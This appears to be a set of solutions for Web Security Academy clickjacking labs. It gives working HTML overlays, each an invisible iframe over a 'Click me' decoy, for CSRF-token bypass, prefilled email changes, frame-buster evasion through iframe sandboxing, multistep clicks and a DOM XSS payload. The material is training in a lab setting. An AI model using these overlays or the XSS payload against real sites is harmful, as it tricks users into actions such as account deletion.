# Clickjacking (UI redressing)

## Basic clickjacking with CSRF token protection

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.0000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:310px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://acb51fbc1faf3227801a430500410078.web-security-academy.net/account"></iframe>
```

## Clickjacking with form input data prefilled from a URL parameter

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:420px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://aca41f091f5bb2d980ee3bc400f600de.web-security-academy.net/email?email=foo@bar.com"></iframe>
```

## Clickjacking with a frame buster script

```html
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 500px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:400px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://ac541f331f3b3af8801a0f9a009f0035.web-security-academy.net/email?email=foo@bar.com"></iframe>
```

## Exploiting clickjacking vulnerability to trigger DOM-based XSS

```html
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 800px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:720px;
        left:50px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://acfa1f681fa8caab8000ccba007700bf.web-security-academy.net/feedback?name=<img src=1 onerror=alert(1)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
XSS exploit: `?name=<img src=1 onerror=alert(1)>`


## Multistep clickjacking

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.00001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 285px;
        left: 50px;
        z-index: 1;
    }

    .second {
        position: absolute;
        top: 285px;
        left: 250px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<div class="second">Click me</div>
<iframe src="https://ac451fab1e2281e08016312a0030004b.web-security-academy.net/account"></iframe>
```